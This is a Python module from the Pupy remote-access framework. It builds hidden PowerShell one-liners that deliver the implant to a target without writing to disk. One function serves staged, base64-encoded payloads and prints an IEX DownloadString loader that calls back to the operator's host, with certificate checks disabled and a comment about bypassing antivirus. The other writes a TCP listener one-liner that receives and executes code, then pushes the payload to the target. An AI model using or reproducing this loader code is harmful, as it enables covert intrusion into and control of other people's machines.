# -*- coding: utf-8 -*-

from pupylib.PupyOutput import List, Success, Warn, Error

from base64 import b64encode

import pupygen
import socket

def serve_ps1_payload(display, server, conf, link_ip="<your_ip>", useTargetProxy=False, nothidden=False):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.pupweb:
        display(Error('Webserver disabled'))
        return

    stage_encoding = "$data='{0}';$code=[System.Text.Encoding]::UTF8.GetString("\
      "[System.Convert]::FromBase64String($data));$data='';iex $code;"

    payload_url_x86 = server.pupweb.serve_content(
        stage_encoding.format(
            b64encode(pupygen.generate_ps1(display, conf, x86=True, as_str=True))),
        as_file=True, alias='ps1 payload [x86]')

    payload_url_x64 = server.pupweb.serve_content(
        stage_encoding.format(
            b64encode(pupygen.generate_ps1(display, conf, x64=True, as_str=True))),
        as_file=True, alias='ps1 payload [x64]')

    protocol = 'http'
    ssl_cert_validation = ''
    not_use_target_proxy = ''
    hidden = '-w hidden '

    if nothidden:
        hidden = ''

    if server.pupweb.ssl:
        protocol = 'https'
        ssl_cert_validation = '[System.Net.ServicePointManager]::'\
          'ServerCertificateValidationCallback={$true};'

    if not useTargetProxy:
        not_use_target_proxy = '$w=(New-Object System.Net.WebClient);'\
          '$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();'

    powershell = "[NOT_USE_TARGET_PROXY][SSL_CERT_VALIDATION]IEX("\
      "New-Object Net.WebClient).DownloadString('[PROTOCOL]://[LINK_IP]:[LINK_PORT][RANDOM]');"

    repls = {
        '[NOT_USE_TARGET_PROXY]': not_use_target_proxy,
        '[SSL_CERT_VALIDATION]': ssl_cert_validation,
        '[PROTOCOL]': protocol,
        '[LINK_IP]': '%s' % link_ip,
        '[LINK_PORT]': '%s' % server.pupweb.port,
    }

    for k,v in repls.iteritems():
        powershell = powershell.replace(k, v)

    launcher_x64 = powershell.replace('[RANDOM]', payload_url_x64)
    launcher_x86 = powershell.replace('[RANDOM]', payload_url_x86)

    # Compute stage1 to gain time response
    ps_template_stage1 = "if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){{ {0} }} else {{ {1} }}"

    # For bypassing AV
    stage1 = r"$code=[System.Text.Encoding]::UTF8.GetString("\
      "[System.Convert]::FromBase64String('{0}'));iex $code;".format(
          b64encode(ps_template_stage1.format(launcher_x64, launcher_x86)))

    landing_uri = server.pupweb.serve_content(stage1, alias='ps1 payload loader')

    launcher            = powershell.replace('[RANDOM]', landing_uri)
    basic_launcher      = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
    oneliner            = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
    encoded_oneliner    = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))

    display(List([
        oneliner,
        encoded_oneliner
    ], caption=Success(
        'Copy/paste one of these one-line loader to deploy pupy without writing on the disk:')))

    display(Warn(
        'Please note that even if the target\'s system uses a proxy, '
        'this previous powershell command will not use the '
        'proxy for downloading pupy'))

def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):

    ps1_template = """$l=[System.Net.Sockets.TcpListener][BIND_PORT];$l.start();$c=$l.AcceptTcpClient();$t=$c.GetStream();
    [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
    if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
    else{$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);}
    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; }
    $t.Close();$l.stop();iex $c;
    """

    main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
    hidden               = '' if nothidden else '-w hidden '
    launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
    launcher             = launcher.replace('\n','').replace('    ','')
    basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
    oneliner             = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
    encoded_oneliner     = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))

    display(List([
            oneliner,
            encoded_oneliner,
        ], caption=Success(
            'Copy/paste one of these one-line loader to '
            'deploy pupy without writing on the disk')))

    display(Success('Generating puppy dll. Be patient...'))

    display(Success('Connecting to {0}:{1}'.format(target_ip, bind_port)))

    s = socket.create_connection((target_ip, int(bind_port)))
    s.settimeout(30)
    s.sendall("\n")

    display(Success('Receiving target architecure...'))

    version = s.recv(1024)
    ps1_encoded = None

    if version == '2':
        display(Success('Target architecture: x64'))
        output_x64 = pupygen.generate_ps1(display, conf, x64=True, as_str=True)
        ps1_encoded = main_ps1_template.format(b64encode(output_x64))
    else:
        display(Success('Target architecture: x86'))
        output_x86 = pupygen.generate_ps1(display, conf, x86=True, as_str=True)
        ps1_encoded = main_ps1_template.format(b64encode(output_x86))

    display(Success('Sending ps1 payload to {0}:{1}'.format(target_ip, bind_port)))
    s.sendall(ps1_encoded)
    s.close()

    display(Success('ps1 payload sent to target {0}:{1}'.format(target_ip, bind_port)))
